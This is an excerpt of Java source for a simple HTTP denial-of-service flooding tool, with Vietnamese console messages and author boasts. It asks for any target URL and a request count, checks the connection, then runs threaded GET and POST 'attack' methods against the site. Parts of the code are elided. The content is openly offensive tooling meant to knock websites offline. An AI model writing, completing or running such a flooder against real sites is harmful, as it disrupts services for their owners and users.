...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.print("Anh là Tùng Đẹp Trai, Anh Đến Từ Bắc Giang. Đừng Quên Tên Anh..................Nhập URL web: ");
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Tấn công tới url: " + url);

        String[] SUrl = url.split("://");

        System.out.println("Đang kiểm tra kết nối tới site");
        ...
        System.out.println("Setting DoS By: XCTMAX DOS");

        System.out.print("Số lượng(10000): ");
        ...
        System.out.println("Tùng đẹp trai vc");
    ...
    private void sslCheckConnection(String url) throws Exception {
        System.out.println("Đang kiểm tra kết nối (ssl)");
        URL obj = new URL(url);
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Đang tấn công post!: " + responseCode + "Thread: " + this.seq);
    }
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("Đang tấn công!: " + responseCode + "Thread: " + this.seq);
    }
